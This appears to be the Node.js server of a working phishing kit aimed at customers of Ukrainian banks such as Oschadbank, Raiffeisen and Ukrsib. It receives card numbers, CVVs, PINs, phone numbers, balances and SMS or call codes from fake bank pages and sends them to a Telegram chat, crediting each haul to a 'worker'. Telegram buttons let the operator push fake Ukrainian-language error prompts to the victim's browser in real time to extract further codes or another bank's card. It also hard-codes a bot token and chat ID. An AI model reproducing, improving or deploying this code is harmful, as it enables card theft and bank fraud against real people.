const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

const hostname = process.env.RENDER_EXTERNAL_HOSTNAME || `localhost:${process.env.PORT || 3000}`;
const WEBHOOK_URL = `https://${hostname}/bot${TELEGRAM_BOT_TOKEN}`;

const banksForRequestButton = [
    'Райффайзен', 'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Очистка старого webhook
fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`)
    .then(() => console.log('Old webhook deleted'))
    .catch(err => console.error('Error deleting old webhook:', err));

// Установка нового webhook
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ 
    server,
    path: '/ws'
});

const clients = new Map();
const sessions = new Map();
const cardVisits = new Map();
let pendingCustom = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = message.toString();
            if (data === 'ping') {
                ws.send('pong');
                return;
            }
            const parsed = JSON.parse(data);
            if (parsed.type === 'register' && parsed.sessionId) {
                clients.set(parsed.sessionId, ws);
                console.log(`Client registered: ${parsed.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, referrer, bankTheme, ...stepData } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, theme=${bankTheme}, data keys: ${Object.keys(stepData).join(', ')}`);

    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    const cardNumber = newData.card_confirm || newData.card;
    if (cardNumber) {
        const cardKey = cardNumber.replace(/\s/g, '');
        const cardData = cardVisits.get(cardKey) || { visitCount: 0 };
        cardData.visitCount++;
        cardVisits.set(cardKey, cardData);
        newData.cardVisitCount = cardData.visitCount;
    }

    if (newData.call_code_input) {
        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>Новий лог!</b>\n\n`;
        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        if (newData.cardVisitCount) {
            const visitText = newData.cardVisitCount === 1 ? 'NEW' : `${newData.cardVisitCount} раз`;
            message += `<b>Кількість переходів по карті:</b> ${visitText}\n`;
        } else {
            const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
            message += `<b>Кількість переходів:</b> ${visitText}\n`;
        }
        message += `<b>Worker:</b> @${workerNick}\n`;

        sendToTelegram(message, sessionId, newData.bankName, bankTheme || newData.bankName.toLowerCase());
    }

    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code, referrer } = req.body;

    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') {
            workerNick = atob(referrer);
        }
    } catch (e) {
        console.error('Error decoding referrer:', e);
    }

    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>Отримано SMS!</b>\n\n`;
        message += `<b>Код:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName, bankTheme) {
    let keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ЛК', callback_data: `lk_${bankTheme}:${sessionId}` }
        ],
        [
            { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
        ],
        [
            { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД', callback_data: `code_error:${sessionId}` },
            { text: 'ТАЙМЕР', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: 'НОМЕР', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ],
        [
            { text: 'BAN', callback_data: `ban:${sessionId}` },
            { text: 'СВОЙ', callback_data: `custom:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[1].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }

    if (bankName !== 'Ощадбанк') {
        keyboard[1] = keyboard[1].filter(btn => btn.text !== 'ЗВОНОК');
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const parts = callbackQuery.data.split(':');
    const type = parts[0];
    const sessionId = parts[1];
    console.log(`Callback: type=${type}, sessionId=${sessionId}`);
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                break;
            case 'lk_oschad':
                ws.send(JSON.stringify({ type: 'lk_oschad', data: {} }));
                break;
            case 'lk_raiffeisen':
                ws.send(JSON.stringify({ type: 'lk_raiffeisen', data: {} }));
                break;
            case 'lk_vostok':
                ws.send(JSON.stringify({ type: 'lk_vostok', data: {} }));
                break;
            case 'lk_izibank':
                ws.send(JSON.stringify({ type: 'lk_izibank', data: {} }));
                break;
            case 'lk_ukrsib':
                ws.send(JSON.stringify({ type: 'lk_ukrsib', data: {} }));
                break;
            case 'call_oschad':
                ws.send(JSON.stringify({ type: 'call_oschad', data: {} }));
                break;
            case 'code_error':
                ws.send(JSON.stringify({ type: 'code_error', data: {} }));
                break;
            case 'request_details':
                ws.send(JSON.stringify({ type: 'request_details', data: {} }));
                break;
            case 'other':
                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
                ws.send(JSON.stringify({ type: 'other', data: commandData }));
                break;
            case 'pin_error':
                commandData = { text: "Невірний ПІН, Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом" };
                ws.send(JSON.stringify({ type: 'pin_error', data: commandData }));
                break;
            case 'number_error':
                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                ws.send(JSON.stringify({ type: 'number_error', data: commandData }));
                break;
            case 'ban':
                ws.send(JSON.stringify({ type: 'ban', data: {} }));
                break;
            case 'custom':
                pendingCustom.set(CHAT_ID, sessionId);
                bot.sendMessage(CHAT_ID, 'Введіть текст для клієнта:');
                break;
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
        console.log(`WS not found for ${sessionId}, state: ${ws ? ws.readyState : 'null'}`);
    }
});

bot.on('message', (msg) => {
    if (msg.text && msg.chat.id.toString() === CHAT_ID && pendingCustom.has(CHAT_ID)) {
        const sessionId = pendingCustom.get(CHAT_ID);
        const ws = clients.get(sessionId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom', data: { text: msg.text } }));
            bot.sendMessage(CHAT_ID, 'Текст відправлено клієнту!');
        } else {
            bot.sendMessage(CHAT_ID, 'Помилка: клієнт не в мережі!');
        }
        pendingCustom.delete(CHAT_ID);
    }
});

bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
